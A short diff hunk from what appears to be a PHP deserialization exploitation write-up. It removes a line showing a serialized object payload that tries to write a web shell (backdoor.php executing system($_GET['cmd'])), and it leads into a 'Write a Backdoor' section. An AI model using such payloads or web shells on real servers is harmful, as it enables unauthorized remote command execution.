@@ -14,9 +14,6 @@ object(__PHP_Incomplete_Class)#1 (1) { ["__PHP_Incomplete_Class_Name"]=> string(
 
 - This confirms PHP unserialize is active, and no filtering is in place.
 
-We try: `O:8:"PHPClass":2:{s:9:"condition";b:1;s:4:"prop";s:66:"system('echo <?php system($_GET["cmd"]); ?> > backdoor.php');";}` -> This payload is accepted, and unserialized, but doesn't execute system(). That’s because *PHPClass* is not defined on the server.
-
-
 ### Write a Backdoor
 
 Create a custom class locally:
